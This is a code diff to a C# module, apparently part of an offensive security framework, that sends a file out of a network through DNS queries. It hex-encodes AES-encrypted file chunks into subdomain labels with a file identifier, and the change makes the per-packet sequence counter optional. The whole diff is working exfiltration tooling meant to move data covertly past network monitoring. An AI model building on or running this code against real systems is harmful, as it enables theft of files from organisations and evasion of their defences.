@@ -14,7 +14,16 @@ namespace Auxiliary.Local.Exfiltration
     {
         #region Configure
         public override string Author { get { return "Fernando Díaz Toledano"; } }
-        public override string Description { get { return "DNS-Exfiltration send"; } }
+        public override string Description
+        {
+            get
+            {
+                return "DNS-Exfiltration send\n" +
+                    "<FileId><PacketNumber><Data>.domain\n" +
+                    "   FileId -> Length in Target\n" +
+                    "   PacketNumber -> 4 bytes, disable in 'SendPacketOrder'";
+            }
+        }
         public override DateTime DisclosureDate { get { return DateTime.MinValue; } }
         public override bool IsLocal { get { return true; } }
         public override Reference[] References
@@ -54,6 +63,8 @@ namespace Auxiliary.Local.Exfiltration
         public string DomainName { get; set; }
         [ConfigurableProperty(Description = "Sleep between calls (ms)")]
         public int Sleep { get; set; }
+        [ConfigurableProperty(Description = "Send packet order")]
+        public bool SendPacketOrder { get; set; }
 
         [ConfigurableProperty(Description = "IV for AES encryption")]
         public string AesIV { get; set; }
@@ -69,6 +80,7 @@ namespace Auxiliary.Local.Exfiltration
 
         public DnsExfiltrate()
         {
+            SendPacketOrder = false;
             DnsServer = null;
             AesIterations = 1000;
             AesKeyLength = AESHelper.EKeyLength.Length256;
@@ -94,7 +106,10 @@ namespace Auxiliary.Local.Exfiltration
             }
 
             // Copy file id
-            int headerLength = g.Length + 4;    // packetNum
+            bool sendPacketOrder = SendPacketOrder;
+            int headerLength = g.Length;
+
+            if (sendPacketOrder) headerLength += 4;    // packetNum
 
             byte[] data = new byte[63 / 2]; // hex 2 bytes per byte
             Array.Copy(g, data, g.Length);
@@ -125,10 +140,12 @@ namespace Auxiliary.Local.Exfiltration
                 while (true)
                 {
                     // copy counter
-                    byte[] p = BitConverterHelper.GetBytesInt32(position);
+                    if (sendPacketOrder)
+                    {
+                        byte[] p = BitConverterHelper.GetBytesInt32(position);
+                        Array.Copy(p, 0, data, headerLength - 4, 4);
+                    }
                     position++;
-
-                    Array.Copy(p, 0, data, headerLength - 4, 4);
 
                     // read
                     int lee = fs.Read(data, headerLength, data.Length - headerLength);
